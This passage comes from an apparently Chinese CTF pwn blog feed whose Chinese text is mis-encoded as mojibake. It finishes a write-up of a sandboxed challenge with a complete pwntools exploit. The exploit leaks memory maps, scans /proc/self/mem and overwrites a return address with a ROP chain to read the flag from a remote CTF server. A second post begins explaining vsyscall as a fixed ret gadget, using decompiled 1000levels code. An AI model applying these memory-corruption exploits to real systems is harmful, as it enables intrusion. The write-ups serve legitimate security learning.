class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­çº¿ç¨‹ä¹ŸåŠ è½½äº†æ²™ç®±è§„åˆ™ è°ƒè¯•æ—¶dumpå‡ºæ¥åæ±‡ç¼–ä¸€ä¸‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F03%2F20250303-114528.png" alt="image-20250303114527889"></p>
<p>åªèƒ½ä½¿ç”¨fnè¦ç”¨åˆ°çš„åŠŸèƒ½ æ‰€ä»¥å­çº¿ç¨‹ä¹Ÿæ˜¯ä¸å¯èƒ½get shellçš„ åªå¯èƒ½å¯¹flag orwå›æ˜¾å†…å®¹</p>
<p>å›åˆ°fnå‡½æ•° ä¸€ä¸ªæ˜æ˜¾çš„æ¼æ´ç‚¹å°±æ˜¯<code>buf</code>é•¿åº¦æ˜¯24å­—èŠ‚ ä½†æ˜¯å¯ä»¥è¯»0x28å­—èŠ‚è¦†ç›–æ‰<code>v8</code> è€ŒåŠŸèƒ½4å¯ä»¥å‘<code>v8</code>å‚¨å­˜çš„åœ°å€å†™å…¥0x200å­—èŠ‚çš„æ•°æ® ä¹Ÿå°±æ˜¯å¯ä»¥ç®€å•åœ°å®ç°ä»»æ„åœ°å€å†™</p>
<p>é—®é¢˜æ˜¯fnå‡½æ•°åŒæ ·ç”¨<code>exit()</code>é€€å‡º æ‰€ä»¥ä¸å¯èƒ½é€šè¿‡ä¿®æ”¹fnçš„è¿”å›åœ°å€æ¥è¯»å‡ºflag è€Œfnä¸­è°ƒç”¨çš„å…·æœ‰è¾“å…¥åŠŸèƒ½çš„å‡½æ•°æœ‰<code>menu()</code> å’Œ <code>read()</code> menuä¸­æ— æ³•åˆ©ç”¨AAW è€ŒåŠŸèƒ½4ä¸­readå‡½æ•°å¯ä»¥ä¿®æ”¹è‡ªå·±çš„è¿”å›åœ°å€è°ƒç”¨ROPé“¾ä¼ªé€ fnçš„æ ˆå¸§å°†[rbp+buf]ä¿®æ”¹ä¸ºâ€™flagâ€™ ç„¶åç›´æ¥è¿”å›åˆ°<code>open(buf, 0)</code>æ¥ç»•è¿‡æ£€æŸ¥å¹¶åˆ©ç”¨åŠŸèƒ½3æ‰“å°å‡ºflag</p>
<p>ç°åœ¨å”¯ä¸€çš„é—®é¢˜æ˜¯fnçš„æ ˆå¸§åœ°å€æ˜¯éšæœºçš„ æˆ‘ä»¬åªèƒ½é€šè¿‡ä¸Šæ–‡æåˆ°çš„ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿ<code>/proc/self/maps</code>æ¥æ³„éœ²å„ä¸ªæ®µçš„åŸºå€ ç„¶åå†é€šè¿‡<code>/proc/self/mem</code>è¯»å–100000å­—èŠ‚çš„æ•°æ® æ£€æŸ¥å…¶ä¸­æ˜¯å¦æœ‰fnæ ˆå¸§ä¸­çš„æ•°æ®æ¥å®šä½fnæ ˆå¸§çš„åœ°å€</p>
<p>ç”±äºfnä¸­çš„åŠŸèƒ½æœ€å¤šåªèƒ½ä½¿ç”¨30æ¬¡ è€Œ100000 * 30å­—èŠ‚çš„æ•°æ®åœ¨mmapå‡ºçš„0x10000000å­—èŠ‚ä¸‹ä¹Ÿåªå äº†å¾ˆå°çš„ä¸€æ®µ æ‰€ä»¥è¿˜ä¸ä¸€å®šèƒ½åœ¨ä¸€æ¬¡è¿œç¨‹è¿æ¥ä¸­æ‰¾åˆ°æ ˆå¸§å¹¶è¿›è¡Œåç»­æ“ä½œ è€Œä¸”å‰ç½®å·¥ä½œå’Œåç»­æ‰“ROPéƒ½éœ€è¦å ç”¨å‡ æ¬¡åŠŸèƒ½çš„ä½¿ç”¨</p>
<p>æœ¬åœ°è°ƒè¯•å‡ æ¬¡å–ä¸ªå¹³å‡å€¼åŠ åˆ°æ³„éœ²å‡ºçš„æ®µåŸºå€ä¸Š ç„¶åé€šè¿‡åŠŸèƒ½2 <code>fseek()</code>å®šä½åˆ°æ­¤å¤„ é€šè¿‡åŠŸèƒ½3è¯»å–æ•°æ®å¹¶æ£€æŸ¥ å½“æ£€æµ‹åˆ°ç‰¹å®šæ•°æ®å­˜åœ¨å°±è®¡ç®—è¿™ä¸ªæ•°æ®æ‰€åœ¨çš„åœ°å€ å†è®¡ç®—readå‡½æ•°çš„è¿”å›åœ°å€å­˜æ”¾çš„ä½ç½®å³å¯åšåˆ°åœ¨ä¸€æ¬¡readåä¼ªé€ æ ˆå¸§å¹¶å†™å…¥ROP</p>
<p>ç»è¿‡è°ƒè¯• æ ˆå¸§ç»“æ„å¦‚ä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOW</span><br><span class="line">...</span><br><span class="line">[rbp + buf - 0x38]    -&gt;	read()&#x27;s retaddress</span><br><span class="line">...</span><br><span class="line">[rbp + buf]            -&gt;	buf[24]	-&gt;	b&#x27;/proc/self/maps\x00&#x27;</span><br><span class="line">[rbp + buf + 0x18]    -&gt;	void *v8</span><br><span class="line">...</span><br><span class="line">HIGH</span><br></pre></td></tr></table></figure>

<p>è¦æ£€æŸ¥çš„ç‰¹å®šæ•°æ®å°±è®¾å®šä¸º<code>b&#39;/proc&#39;</code></p>
<p>å®Œæ•´exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ho_grey&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;localhost&#x27;, 20000)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;5.Exit&#x27;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">n</span>):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;get?&#x27;</span>, <span class="built_in">str</span>(n).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;something:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_offset</span>(<span class="params">n</span>):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;you?&#x27;</span>, <span class="built_in">str</span>(n).encode())</span><br><span class="line"></span><br><span class="line">program_base = <span class="number">0</span></span><br><span class="line">heap_base = <span class="number">0</span></span><br><span class="line">stack_base = <span class="number">0</span></span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, xxxxx)</span><br><span class="line">    sla(<span class="string">b&#x27;Y/n?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;finding?&#x27;</span>, <span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;get?&#x27;</span>, <span class="string">b&#x27;10000&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">    maps = ru(<span class="string">b&#x27;Find something&#x27;</span>).decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    program_base = <span class="built_in">int</span>(maps[<span class="number">0</span>].split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    heap_base = <span class="built_in">int</span>(maps[<span class="number">3</span>].split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    stack_base = <span class="built_in">int</span>(maps[<span class="number">4</span>].split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;program_base: &#x27;</span> + <span class="built_in">hex</span>(program_base))</span><br><span class="line">    log.info(<span class="string">&#x27;heap_base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">    log.info(<span class="string">&#x27;stack_base: &#x27;</span> + <span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    mem = <span class="string">b&#x27;/proc/self/mem\x00&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;finding?&#x27;</span>, mem)</span><br><span class="line">    alignn = <span class="number">100000</span></span><br><span class="line">    memo = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    pos = stack_base + <span class="number">0x600000</span></span><br><span class="line">    set_offset(pos)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        log.info(<span class="string">f&#x27;Round: <span class="subst">&#123;<span class="built_in">hex</span>(pos)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            memo = get(alignn)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pos += alignn</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;/proc&#x27;</span> <span class="keyword">in</span> memo:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">ru(<span class="string">b&#x27;1.Find something&#x27;</span>)</span><br><span class="line">pos = pos - alignn + memo.find(<span class="string">b&#x27;/proc&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Found /proc/self/mem at &#x27;</span> + <span class="built_in">hex</span>(pos))</span><br><span class="line"></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;./run.sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x18</span> - <span class="built_in">len</span>(payload)) + p64(pos - <span class="number">0x38</span>)</span><br><span class="line">sa(<span class="string">b&#x27;finding?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">4</span>)</span><br><span class="line">path = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">path += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x18</span> - <span class="built_in">len</span>(path)) + p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">sa(<span class="string">b&#x27;content: &#x27;</span>, p64(program_base + <span class="number">0x1150</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x30</span> + path)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æœ¬åœ°æ‹¿åˆ°flagä¸éœ€è¦åœ¨å†™å…¥ROPå’Œ<code>b&#39;flag&#39;</code>æ—¶è¿›ä¸€æ­¥è¦†ç›–æ‰<code>v8</code> è€Œè¿œç¨‹æ‹¿åˆ°flagéœ€è¦å°†v8åœ°å€è¦†ç›–æˆä¸€ä¸ªå¯è¯»å¯å†™çš„åœ°å€</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vsyscallåœ¨Pwnä¸­çš„åº”ç”¨</title>
    <url>/2025/02/12/Vsyscall%E5%9C%A8Pwn%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p>å’¦!? è¿™éƒ½æœ‰retnç”¨çš„å“¦ åš¯åš¯åš¯åš¯åš¯åš¯</p>
<span id="more"></span>

<h2 id="Vsyscallæ˜¯ä»€ä¹ˆ"><a href="#Vsyscallæ˜¯ä»€ä¹ˆ" class="headerlink" title="Vsyscallæ˜¯ä»€ä¹ˆ?"></a>Vsyscallæ˜¯ä»€ä¹ˆ?</h2><p>ç®€å•æ¥è¯´è¿™æ˜¯æ—©æœŸLinuxç³»ç»Ÿ(Ubuntu 12.04 LTS ~ Ubuntu 16.04 LTS; glibc2.15 ~ glibc2.23; æ›´é«˜çš„ç‰ˆæœ¬è¿™ä¸ªæœºåˆ¶é€æ¸è¢«vDSOå–ä»£ å¯ä»¥æ‰‹åŠ¨å¼€å¯)å¯¹å‡ ä¸ªç³»ç»Ÿè°ƒç”¨åšçš„ç®€åŒ–æœºåˆ¶ åœ¨ç¨‹åºè¢«è½½å…¥è™šæ‹Ÿå†…å­˜æ—¶ä¼šåŠ ä¸Šä¸€æ®µ<code>Vsyscall</code> å…¶ä¸­æœ‰<code>gettimeofday</code>, <code>time</code>, <code>getcpu</code> 3ä¸ªç³»ç»Ÿè°ƒç”¨</p>
<p>è¿™å‡ ä¸ªç³»ç»Ÿè°ƒç”¨åœ¨ä»»ä½•æƒé™ä¸‹éƒ½å¯ä»¥è°ƒç”¨è€Œä¸”ç›¸æ¯”ä½¿ç”¨å¯¹åº”çš„ç”¨æˆ·æ€å‡½æ•°æ›´å¿«</p>
<p>ä½†æ˜¯Vsyscallæœ‰ä¸€ä¸ªè‡´å‘½ç¼ºé™·å°±æ˜¯è¿™ä¸ªæ®µåœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„åœ°å€æ˜¯å›ºå®šçš„ å³ä½¿å¼€å¯äº†PIEè¿™å‡ ä¸ªç³»ç»Ÿè°ƒç”¨çš„åœ°å€ä¹Ÿæ˜¯å›ºå®šçš„ åˆ†åˆ«æ˜¯0xffffffffff600000, 0xffffffffff600400ï¼Œ0xffffffffff600800</p>
<p>åŒæ—¶è¿™å‡ ä¸ªç®€å•çš„ç³»ç»Ÿè°ƒç”¨ä¸éœ€è¦å‚æ•° è¿™æ„å‘³ç€åœ¨ä¸å¯¹å¯„å­˜å™¨å€¼æœ‰è¦æ±‚çš„æƒ…å†µä¸‹Vsyscallå¯ä»¥å½“ä½œ<code>ret</code>çš„ä¸‹ä½æ›¿ä»£ </p>
<p>æ›´è¯¦ç»†çš„ä¿¡æ¯å‚è€ƒ<a href="https://stackoverflow.com/questions/19938324/what-are-vdso-and-vsyscall">è¿™ç¯‡é—®ç­”</a></p>
<h2 id="åº”ç”¨ä¸¾ä¾‹"><a href="#åº”ç”¨ä¸¾ä¾‹" class="headerlink" title="åº”ç”¨ä¸¾ä¾‹"></a>åº”ç”¨ä¸¾ä¾‹</h2><h3 id="æ”»é˜²ä¸–ç•Œ-1000levels"><a href="#æ”»é˜²ä¸–ç•Œ-1000levels" class="headerlink" title="[æ”»é˜²ä¸–ç•Œ] 1000levels"></a>[æ”»é˜²ä¸–ç•Œ] 1000levels</h3><p>å…ˆæ£€æŸ¥ä¸€ä¸‹ é™¤äº†Canaryä¿æŠ¤å…¨å¼€</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-154759.png" alt="image-20250212154759830"></p>
<p>IDAçœ‹çœ‹é€»è¾‘:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Go&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Hint&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Give up&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_DDC();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      num = get_num();</span><br><span class="line">      <span class="keyword">if</span> ( num != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      hint();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">1</span> )</span><br><span class="line">      guess();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong input&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_D92();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªæœ‰ä¸¤ä¸ªåŠŸèƒ½ å…ˆçœ‹çœ‹hint:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( unk_20208C )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>unk_20208C</code>éé›¶å°±ä¼šæ³„éœ²<code>system</code>çš„åœ°å€ ä½†æ˜¯äº¤å‰å¼•ç”¨ä¸€ä¸‹å°±ä¼šå‘ç°æ²¡æœ‰åˆ«çš„åœ°æ–¹ç”¨åˆ°äº†è¿™ä¸ªå€¼ æ­£å¸¸ä¸å¯èƒ½è¿›å…¥è¯¥åˆ†æ”¯</p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹çœŸæ­£èƒ½æ“ä½œçš„éƒ¨åˆ†:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">test</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  _QWORD buf[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !test(a1 - <span class="number">1</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v6 = rand() % a1;</span><br><span class="line">  v5 = rand() % a1;</span><br><span class="line">  v4 = v5 * v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Level %d\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Question: %d * %d = ? Answer:&quot;</span>, v6, v5);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  v2 = strtol((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 == v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">guess</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are being a real man.&quot;</span>);</span><br><span class="line">      v6 = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( test(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, v3 - v2);</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward Coward Coward Coward Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æˆ‘ä»¬è¾“å…¥è¦æŒ‘æˆ˜çš„ç­‰çº§æ•°ç„¶åè¿›è¡Œç®—æ•°æŒ‘æˆ˜ <code>test</code>ä¸­æœ‰è¶³å¤Ÿçš„æº¢å‡ºé‡è€Œä¸”ç¨‹åºä¸­é“¾æ¥äº†<code>system</code> é—®é¢˜æ˜¯é¢˜ç›®å¼€å¯äº†PIE å³ä½¿æœ‰è¶³å¤Ÿçš„æº¢å‡ºé‡ä¹Ÿæ— æ³•è°ƒç”¨åˆ°ç”šè‡³ä¼ é€’å‚æ•°ç»™<code>system</code></p>
<p>è¿™é‡Œå”¯ä¸€èƒ½è”æƒ³åˆ°æ¼æ´çš„å°±æ˜¯<code>guess</code>ä¸­<code>v4(qword [rbp - 0x110])</code>æ˜¯æœ‰å¯èƒ½æœªå®šä¹‰çš„(ç¬¬ä¸€æ¬¡è¾“å…¥æŒ‘æˆ˜æ¬¡æ•°å°äº1æ—¶) è¿™ä¼šå¯¼è‡´<code>v4</code>å¯èƒ½ä¼šæ³„éœ²åŒä¸€ä¸ªè°ƒç”¨æ·±åº¦(è‡ªåˆ›çš„è¯ æƒ³ä¸å‡ºåˆ«çš„å½¢å®¹ callè¯­å¥ä½¿æ·±åº¦+1 retä½¿æ·±åº¦-1)çš„æ ˆå¸§ä¸­çš„æŸä¸ªå˜é‡</p>
<p>å’Œ<code>guess</code>åœ¨åŒä¸€ä¸ªè°ƒç”¨æ·±åº¦çš„å‡½æ•°ä¼šæ˜¯å“ªä¸ªå‘¢? å†æ¥çœ‹çœ‹æ¯”<code>guess</code>æµ…1å±‚çš„main ä¸éš¾æƒ³åˆ°ä¸å¦‚çœ‹çœ‹<code>hint</code>å§</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-160929.png" alt="image-20250212160929752"></p>
<p>ç°åœ¨å†çœ‹å°±ä¼šè§‰å¾—é¢˜ç›®å‡ºçš„æœ‰ç‚¹åˆ»æ™´äº† å¦‚æœåœ¨è°ƒç”¨<code>guess</code>å‰è°ƒç”¨äº†<code>hint</code> é‚£ä¹ˆè¿™ä¸ªæœªå®šä¹‰çš„<code>v4</code>å°±ä¼šæ³„éœ²<code>system</code>çš„åœ°å€å¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¬¬äºŒæ¬¡è¾“å…¥æŒ‘æˆ˜æ¬¡æ•°æ¥æ”¹å˜è¿™ä¸ªå€¼ä¸ºä»»æ„çš„åœ°å€:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-161212.png" alt="image-20250212161212805"></p>
<p>ç°åœ¨ å½“æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªone gadgetå¹¶å°†å®ƒä¸<code>system</code>çš„åç§»åœ¨ç¬¬äºŒæ¬¡è¾“å…¥æŒ‘æˆ˜æ¬¡æ•°æ—¶è¾“å…¥ æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªæ ˆä¸Šçš„ROPgadget ç°åœ¨å”¯ä¸€çš„é—®é¢˜æ˜¯è¦å¦‚ä½•å°†<code>RSP</code>ç§»åŠ¨åˆ°è¿™ä¸ªåœ°å€ä¸Šå¹¶æ‰§è¡Œ<code>retn</code> è¿™é‡Œå°±ç”¨åˆ°äº†ä¸Šé¢ä»‹ç»çš„Vsyscall åªè¦ç”¨è¿™ä¸ªå½“ä½œ<code>retn</code>åœ¨testæœ€åä¸€æ¬¡è¢«è°ƒç”¨(æ­¤æ—¶è°ƒç”¨æ·±åº¦ä¸ºguessçš„+1)æ—¶ä»<code>[rbp + buf]</code>å¼€å§‹ä¸€ç›´è¦†ç›–åˆ°<code>guess</code>çš„æ ˆå¸§ç›´åˆ°æˆ‘ä»¬çš„one gadget(ä¹Ÿå¯ä»¥æå‰è¦†ç›– testæ˜¯é€’å½’è°ƒç”¨çš„ è°ƒç”¨æ·±åº¦ä¼šå¾ˆæ·± éœ€è¦è¦†ç›–çš„æ ˆå¸§ä¼šæ¯”è¾ƒå¤š æº¢å‡ºé‡ä¸ä¸€å®šå¤Ÿç”¨ ç›´æ¥ä»æœ€åä¸€æ¬¡å¼€å§‹è¦†ç›–ç”¨åˆ°çš„æº¢å‡ºé‡ä¼šå°‘ä¸€ç‚¹)</p>
<p>è¿™é‡Œç»™å‡ºexp:</p>
